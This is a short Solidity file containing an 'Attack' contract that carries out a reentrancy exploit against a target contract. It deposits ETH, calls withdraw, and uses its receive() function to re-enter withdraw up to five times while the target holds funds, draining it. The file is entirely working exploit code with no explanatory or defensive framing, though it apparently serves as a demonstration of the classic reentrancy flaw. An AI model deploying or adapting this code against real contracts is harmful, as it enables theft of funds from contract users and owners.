// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attack {
    IVulnerable public target;
    uint256 public attackAmount;
    uint256 public count;
    uint256 public maxLoops = 5;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function attack() external payable {
        // Step 1: Deposit some ETH into the target
        attackAmount = 1 ether;
        target.deposit{value: msg.value}();

        // Step 2: Start the attack
        target.withdraw(attackAmount);
    }

    // This function is triggered when receiving ETH
    receive() external payable {
        if (address(target).balance >= attackAmount && count < maxLoops) {
        count++;
        target.withdraw(attackAmount);
        }
    }

    function reset() external {       
        count = 0;
    }
}